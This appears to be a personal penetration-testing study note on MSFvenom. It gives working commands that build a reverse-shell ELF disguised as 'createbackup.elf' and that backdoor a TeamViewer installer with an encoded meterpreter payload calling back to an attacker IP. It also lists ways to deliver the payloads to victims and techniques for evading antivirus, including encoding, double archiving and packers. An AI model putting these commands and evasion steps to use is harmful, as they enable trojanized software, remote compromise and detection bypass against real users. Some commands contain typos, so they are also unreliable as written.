```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
MSFvenom is a tool within the [[Metasploit]] framework for creating, encrypting & encoding payloads. The delivery of these payloads is up to the attacker, this tool only aids to creates them. This is a really useful tool if we don't have direct access to the target system but we need a payload that we can deliver another way (eg. social engineering).

### Staged vs Stageless Payloads
A *staged* payload will only setup a 'small stage' that will then call back to the attack box to download the rest of the payload, and execute it. These take up space in memory so there is less space for the actual payload. These are useful when an exploit scenario has little space for a large payload to be uploaded but instead we could upload a stage that then downloads a larger payload into a more suitable place / into larger memory.

A *stageless* payload does not have a stage. The entire payload is sent over the network connection at once. This could benefit us in environments with little bandwidth or latency where a staged payload may not be stable enough. Sometimes these can be better for evasion too as they cause less network traffic, which could be helpful for a social engineering attack.

The description or the format of the name of the payload can identify if it is staged or stageless.
```bash
# Staged (indicated by the /'s ) we can see the different stages (eg. {0} create a shell, {1} then create a reverse tcp)
windows/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp

# Stageless
windows/meterpreter_reverse_tcp
linux/zarch/meterpreter_reverse_tcp
```

![[Metasploit#Installation]]

## Documentation
**Cheatsheet:** 
**Website:** 
## Usage

### List all payloads
```sh
msfvenon -l payloads
# Payloads will commonly be named with their OS first eg. windows/dllinject/bind_tcp
```

### Building a stageless payload
```bash
msfvenom -p [payload_path] [options] -f [binary_format] > [file_name].[binary_format]

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.112 LPORT=443 -f elf > createbackup.elf
```
We could then deliver this to our target system, common ways include:
- Email with file attached
- Download link on a website
- Combined with a metasploit exploit (but would likely need us to be on the internal network)
- Via portable media during an on-site attack
> We also need to make sure it gets executed once on the system.

![[Metasploit#Scanning a payload for possible detection]]

### Building a backdoor'ed executable
You can build a payload into an existing executable by using the `-k` flag. This will embed the payload into the executable and when run, will create a separate thread from the main application that is running our backdoor.
```sh
# This command embeds the meterpreter stageless payload into the provided TeamViewer_Setup.exe.
# It also encodes the payload using the shikata_ga_nai algo with 5 iterations.
msfvenom window/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -i 5 -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe
```
> The only issue with this is that if the application is launched via a CLI, a second window running the payload will open too.

## Evading AV detection
There are many protection mechanisms eg. [[Intrusion Detection]] and AVs. These systems are getting sophisticated and are capable of detecting most *default* payloads. Some mechanisms for evading them are still present as most AVs heavily rely on signature detection.
### Multi-layered archiving
Using a tool like [RAR utility](https://www.rarlab.com/download.htm) (WinRAR for linux) we can double archive a payload, making it much harder to get the actual signature of the contents.
### Using Encoding
Although this is often not enough these days to evade all AVs, it is still a critical step to be used with other techniques. Algorithms like `shikata_ga_nai` with multiple iterations can drastically improve the signature evasion capabilities of a payload.
### Packers
This is where the payload is compressed with the executable, to later be decompressed into its original form for execution. MSFVenom also allows you to change the file structure and encrypt the underlying process structure to further complicate the payload's signature.
- [UPX packer](https://upx.github.io/)
- [The Enigma Protector](https://enigmaprotector.com/)
- [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)
- Alternate EXE Packer
- ExeStealth
- Morphine
- MEW
- Themida
